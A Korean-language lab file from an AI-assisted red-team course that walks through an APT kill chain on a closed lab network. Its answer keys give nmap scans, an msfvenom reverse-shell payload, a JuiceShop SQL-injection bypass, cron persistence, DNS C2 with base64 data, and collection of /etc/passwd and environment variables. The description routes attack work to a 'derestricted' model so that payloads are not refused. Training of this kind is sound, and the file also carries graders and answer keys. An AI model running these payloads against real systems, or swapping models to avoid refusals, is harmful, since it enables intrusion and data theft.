lab_id: battle-adv-ai-week01
title: APT 킬체인 시뮬레이션 — 정찰부터 목표 달성까지 (AI 지원)
version: ai
course: battle-adv-ai
week: 1
description: 'APT(Advanced Persistent Threat) 공격의 전체 킬체인을 단일 인프라에서 시뮬레이션한다. MITRE
  ATT&CK 프레임워크를 기반으로 Reconnaissance → Weaponization → Delivery → Exploitation → Installation
  → C2 → Actions 7단계를 실습하고, 각 단계의 탐지 포인트를 식별한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
  [Model] 공격·대전 과목은 Bastion manager LLM 을 gurubot/gpt-oss-derestricted:120b 로 자동 라우팅한다
  (실제 공격 페이로드 생성 필요). 상세: contents/labs/MODEL_ROUTING.md'
difficulty: hard
duration_minutes: 150
objectives:
- APT 킬체인 7단계를 이해하고 각 단계별 기법을 실습한다
- MITRE ATT&CK 매트릭스에 공격 기법을 매핑한다
- 각 킬체인 단계에서의 탐지 포인트를 식별한다
prerequisites:
- battle-nonai 과정 전체 이수
- MITRE ATT&CK 프레임워크 기본 이해
- Linux 시스템 관리 중급 수준
infra_requirements:
- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
- secu (10.20.30.1) — nftables, suricata
- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] APT 정찰 단계 — 타겟 네트워크 10.20.30.0/24에서 서비스 배너와 OS를 동시에 탐지하라. 스텔스
    SYN 스캔과 서비스 버전 탐지를 결합하고 결과를 XML로 저장하라.'
  hint: -sS -sV -O 옵션을 조합하고 --script=banner도 추가한다.
  category: recon
  points: 10
  answer: '🤖 프롬프트: [RED] APT 정찰 단계 — 타겟 네트워크 10.20.30.0/24에서 서비스 배너와 OS를 동시에 탐지해줘

    📎 참고 (CLI): sudo nmap -sS -sV -O --script=banner --max-retries 1 --host-timeout
    15s -T4 10.20.30.0/24 -oX /tmp/apt_recon.xml'
  answer_detail: APT 시뮬레이션의 Reconnaissance 단계이다. -sS(SYN 스캔)는 TCP 3-way handshake를
    완료하지 않아 로그에 남기 어렵고, -sV는 서비스 버전을, -O는 OS를 탐지한다. XML 출력은 Metasploit에서 import 가능하다.
  verify:
    type: file_exists
    expect: /tmp/apt_recon.xml
    field: filesystem
    semantic:
      intent: '[RED] APT Recon — nmap -sS -sV -O --open (스텔스 SYN + 서비스 버전 + OS 탐지)
        10.20.30.0/24 대역. passive 정찰(whois/dig) 후 minimum probe 로 서비스·OS 핑거프린팅. 대규모
        시도는 은닉성 저해하므로 top-ports 제한'
      success_criteria:
      - sudo nmap -sS -sV -O 실행
      - 스텔스 SYN + OS 탐지 옵션
      - 10.20.30.0/24 대역 대상
      acceptable_methods:
      - nmap -sS -sV -O --open
      - nmap --script smb-os-discovery
      - p0f passive OS fingerprint
      - Shodan/Censys 활용
      negative_signs:
      - -sT 사용 (full connect 추적됨)
      - OS 탐지 없음
      - 범위 제한 없는 대량 스캔
  target_vm: attacker
  script: sudo nmap -sS -sV -O --script=banner --max-retries 1 --host-timeout 15s
    -T4 10.20.30.0/24 -oX /tmp/apt_recon.xml
  risk_level: low
  bastion_prompt: '[RED] APT 정찰 단계 — 타겟 네트워크 10.20.30.0/24에서 서비스 배너와 OS를 동시에 탐지해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: '[RED] 수집된 정보를 기반으로 웹 서버({{WEB_IP}})의 보안 헤더와 취약점 징후를 점검하라. HTTP 보안
    헤더를 분석하고, nmap의 vuln 스크립트로 알려진 취약점을 탐색하라.'
  hint: curl -sI로 보안 헤더를 확인하고, nmap --script vuln으로 취약점을 탐색한다.
  category: recon
  points: 10
  answer: '🤖 프롬프트: [RED] 수집된 정보를 기반으로 웹 서버(10.20.30.80)의 보안 헤더와 취약점 징후를 점검하라. HTTP
    보안 헤더를 분석하고, nmap의 vuln 스크립트로 알려진 취약점을 탐색해줘

    📎 참고 (CLI): echo "=== HTTP Security Headers ===" && curl -sI http://10.20.30.80
    | grep -iE "(Server|X-Powered-By|X-Frame|X-Content-Type|Strict-Transport|Content-Security)"
    && echo "=== Missing headers indicate weak config ===" && echo "" && echo "===
    Nmap vuln scan ===" && nmap --script vuln -p 80,3000,8080 --max-retries 1 --host-timeout
    15s -T4 10.20.30.80 2>/dev/null | head -40'
  answer_detail: Weaponization 준비 단계로, HTTP 보안 헤더 부재와 nmap vuln 스크립트로 알려진 취약점을 탐색한다.
    X-Frame-Options, Content-Security-Policy 등의 부재는 XSS, Clickjacking 등의 공격 가능성을 나타낸다.
  verify:
    type: output_contains
    expect: HTTP Security Headers
    semantic:
      intent: '[RED] 웹 서버 보안 헤더 점검 — curl -sI http://<web>:3000/ 로 응답 헤더 취합 + grep
        -E (X-Frame-Options|Content-Security-Policy|Strict-Transport-Security|X-XSS-Protection)
        로 누락 헤더 확인. 보안 헤더 부재 = XSS/clickjacking/MITM 취약점 가능성. 공격 가능 여부 판별 근거'
      success_criteria:
      - curl -sI HEAD 요청
      - X-Frame-Options / CSP / HSTS 같은 보안 헤더 확인
      - 누락된 헤더가 취약점 지표임을 인지
      acceptable_methods:
      - curl -sI + grep 보안 헤더
      - securityheaders.com API
      - testssl.sh + nmap ssl-enum-ciphers
      - Mozilla Observatory 스캔
      negative_signs:
      - 전체 응답만 (헤더 필터 없음)
      - 누락된 보안 헤더 해석 없음
      - 취약점 연결 없음
  target_vm: attacker
  script: echo "=== HTTP Security Headers ===" && curl -sI http://10.20.30.80 | grep
    -iE "(Server|X-Powered-By|X-Frame|X-Content-Type|Strict-Transport|Content-Security)"
    && echo "=== Missing headers indicate weak config ===" && echo "" && echo "===
    Nmap vuln scan ===" && nmap --script vuln -p 80,3000,8080 --max-retries 1 --host-timeout
    15s -T4 10.20.30.80 2>/dev/null | head -40
  risk_level: low
  bastion_prompt: '[RED] 수집된 정보를 기반으로 웹 서버(10.20.30.80)의 보안 헤더와 취약점 징후를 점검하라. HTTP
    보안 헤더를 분석하고, nmap의 vuln 스크립트로 알려진 취약점을 탐색해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: '[RED] Weaponization — msfvenom으로 리버스 쉘 페이로드를 생성하라. Linux ELF 바이너리
    형태로 생성하되 실행하지 말고 저장만 하라.'
  hint: msfvenom -p linux/x64/shell_reverse_tcp 옵션을 사용한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] Weaponization — msfvenom으로 리버스 쉘 페이로드를 생성하라. Linux ELF 바이너리
    형태로 생성하되 실행하지 말고 저장만 해줘

    📎 참고 (CLI): msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444
    -f elf -o /tmp/apt_payload.elf && file /tmp/apt_payload.elf && echo "Payload generated
    (SAVE ONLY - do not execute)"'
  answer_detail: APT의 Weaponization 단계에서 공격자는 exploit 페이로드를 제작한다. msfvenom은 Metasploit의
    페이로드 생성 도구로, ELF 바이너리 형태의 리버스 쉘을 생성한다. 실습에서는 페이로드 구조를 이해하기 위해 생성만 하고 실행하지 않는다.
  verify:
    type: file_exists
    expect: /tmp/apt_payload.elf
    field: filesystem
    semantic:
      intent: '[RED] Weaponization msfvenom ELF 페이로드 — msfvenom -p linux/x64/shell_reverse_tcp
        LHOST=<attacker> LPORT=4444 -f elf -o /tmp/payload.elf 로 Linux ELF 리버스 쉘 바이너리
        생성. 실제 실행 없이 파일 크기·헤더(file) 확인. MITRE T1587.001 Develop Malware'
      success_criteria:
      - msfvenom -p linux/x64/shell_reverse_tcp
      - ELF 바이너리 파일 생성
      - MITRE T1587.001 개념
      acceptable_methods:
      - msfvenom -p linux/x64/shell_reverse_tcp -f elf
      - msfvenom -p cmd/unix/reverse_bash
      - golang 으로 직접 작성
      - Sliver implant 생성
      negative_signs:
      - 페이로드 실제 실행 (위험)
      - ELF 아닌 다른 포맷
      - Weaponization 단계 인지 없음
  target_vm: attacker
  script: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f
    elf -o /tmp/apt_payload.elf && file /tmp/apt_payload.elf && echo "Payload generated
    (SAVE ONLY - do not execute)"
  risk_level: medium
  bastion_prompt: '[RED] Weaponization — msfvenom으로 리버스 쉘 페이로드를 생성하라. Linux ELF 바이너리
    형태로 생성하되 실행하지 말고 저장만 해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 4
  instruction: '[RED] Exploitation — JuiceShop({{WEB_IP}}:3000)의 로그인 엔드포인트에 SQL Injection을
    수행하여 인증을 우회하라.'
  hint: REST API에 JSON 형태로 SQL Injection 페이로드를 전송한다.
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: [RED] Exploitation — JuiceShop(10.20.30.80:3000)의 로그인\
    \ 엔드포인트에 SQL Injection을 수행하여 인증을 우회해줘\n\U0001F4CE 참고 (CLI): curl -s -X POST http://10.20.30.80:3000/rest/user/login\
    \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"\\\" OR 1=1--\"\
    ,\"password\":\"test\"}' \\\n | python3 -m json.tool"
  answer_detail: Exploitation 단계에서 SQL Injection(T1190)으로 인증을 우회한다. JuiceShop의 로그인
    폼에 SQL 구문을 삽입하여 admin 토큰을 획득한다. 이 기법은 OWASP Top 10의 A03:2021-Injection에 해당한다.
  verify:
    type: output_contains
    expect: token
    semantic:
      intent: '[RED] APT Exploitation — JuiceShop /rest/user/login 에 '' or 1=1-- SQLi
        로 관리자 JWT 토큰 획득 + 추가 /api/Users 접근. SQLi 가 인증 우회(T1078) + 자격 증명 수집(T1552)
        조합. Kill Chain 4단계 Exploitation 실전'
      success_criteria:
      - JuiceShop /rest/user/login SQLi 실행
      - JWT token 또는 authentication 필드
      - T1078 + T1552 ATT&CK 매핑
      acceptable_methods:
      - curl POST SQLi 페이로드
      - sqlmap --data 자동화
      - python requests + SQLi
      - Burp Repeater
      negative_signs:
      - 토큰 추출 없음
      - ATT&CK 매핑 없음
      - Exploitation 맥락 없음
  target_vm: attacker
  script: "curl -s -X POST http://10.20.30.80:3000/rest/user/login \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"test\"\
    }' \\\n | python3 -m json.tool"
  risk_level: medium
  bastion_prompt: '[RED] Exploitation — JuiceShop(10.20.30.80:3000)의 로그인 엔드포인트에 SQL
    Injection을 수행하여 인증을 우회해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 5
  instruction: '[RED] Installation(Persistence) — crontab을 이용한 지속성 확보를 시뮬레이션하라. 무해한
    echo 명령으로 시뮬레이션한다.'
  hint: crontab에 비컨 시뮬레이션 명령을 등록한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] Installation(Persistence) — crontab을 이용한 지속성 확보를 시뮬레이션해줘

    📎 참고 (CLI): echo ''*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"''
    | crontab - && crontab -l | grep APT_PERSISTENCE'
  answer_detail: Installation 단계에서 Persistence 메커니즘을 설치한다(T1053.003). crontab은 시스템
    재부팅 후에도 유지되는 지속성 기법이다. 실습에서는 무해한 echo 명령으로 시뮬레이션한다.
  verify:
    type: output_contains
    expect:
    - APT_PERSISTENCE
    - crontab
    semantic:
      intent: '[RED] Installation/Persistence crontab — crontab -l 현재 확인 + (crontab
        -l; echo * * * * * echo APT-test >> /tmp/.hidden_apt.log) | crontab - 로 무해한
        echo 명령 등록. 실제 악성 대신 테스트용. MITRE T1053.003 Scheduled Task/Job — Cron'
      success_criteria:
      - crontab -l 로 현재 확인
      - 무해한 echo 또는 date 명령 등록 (시뮬레이션)
      - T1053.003 Cron 지속성 개념
      acceptable_methods:
      - crontab -l + crontab 수정
      - /etc/cron.d/ 파일 드롭
      - systemd timer 대체 (T1053.006)
      - at 명령 (T1053.001)
      negative_signs:
      - 악성 명령 실제 등록
      - 지속성 개념 없음
      - MITRE T1053 매핑 없음
  target_vm: attacker
  script: echo '*/5 * * * * /bin/bash -c "echo APT_PERSISTENCE_TEST > /tmp/apt_persist.txt"'
    | crontab - && crontab -l | grep APT_PERSISTENCE
  risk_level: medium
  bastion_prompt: '[RED] Installation(Persistence) — crontab을 이용한 지속성 확보를 시뮬레이션해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 6
  instruction: '[RED] C2 시뮬레이션 — DNS 기반 C2 통신을 모방하여 base64 인코딩 데이터를 DNS 쿼리에 포함하라.
    그 후 수집한 시스템 정보를 /tmp/apt_exfil.txt에 저장하라.'
  hint: base64로 데이터를 인코딩한 후 서브도메인으로 구성하여 DNS 쿼리를 보낸다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] C2 시뮬레이션 — DNS 기반 C2 통신을 모방하여 base64 인코딩 데이터를 DNS 쿼리에 포함해줘

    📎 참고 (CLI): echo ''APT_C2_DATA'' | base64 | tr -d ''='' | xargs -I{} nslookup
    {}.test.local 2>&1 | head -5 && cat /etc/passwd > /tmp/apt_exfil.txt && env >>
    /tmp/apt_exfil.txt && ip addr >> /tmp/apt_exfil.txt && wc -l /tmp/apt_exfil.txt'
  answer_detail: C2 단계에서 DNS 기반 통신(T1071.004)을 시뮬레이션한다. DNS 프로토콜은 거의 모든 방화벽에서 허용되므로
    탐지가 어렵다. Actions on Objectives로 시스템 정보를 수집(T1005)하여 유출 준비를 한다.
  verify:
    type: file_exists
    expect: /tmp/apt_exfil.txt
    field: filesystem
    semantic:
      intent: '[RED] DNS 기반 C2 시뮬레이션 — echo <data> | base64 로 인코딩 + dig TXT <base64>.c2.evil.com
        같은 서브도메인에 데이터 embedding 후 nslookup 전송. DNS 는 아웃바운드 차단 우회 채널로 악용. MITRE T1071.004
        Application Layer Protocol — DNS'
      success_criteria:
      - base64 인코딩 + DNS 쿼리 embedding
      - dig 또는 nslookup 로 전송 시뮬레이션
      - T1071.004 DNS C2 개념
      acceptable_methods:
      - echo data | base64 + dig TXT
      - dnscat2 실제 도구 (교육용)
      - iodine / DNSCat2 로 터널링
      - python dnspython 라이브러리
      negative_signs:
      - HTTP C2 재사용 (DNS 아님)
      - base64 없이 평문
      - C2 개념 언급 없음
  target_vm: attacker
  script: echo 'APT_C2_DATA' | base64 | tr -d '=' | xargs -I{} nslookup {}.test.local
    2>&1 | head -5 && cat /etc/passwd > /tmp/apt_exfil.txt && env >> /tmp/apt_exfil.txt
    && ip addr >> /tmp/apt_exfil.txt && wc -l /tmp/apt_exfil.txt
  risk_level: medium
  bastion_prompt: '[RED] C2 시뮬레이션 — DNS 기반 C2 통신을 모방하여 base64 인코딩 데이터를 DNS 쿼리에 포함해줘


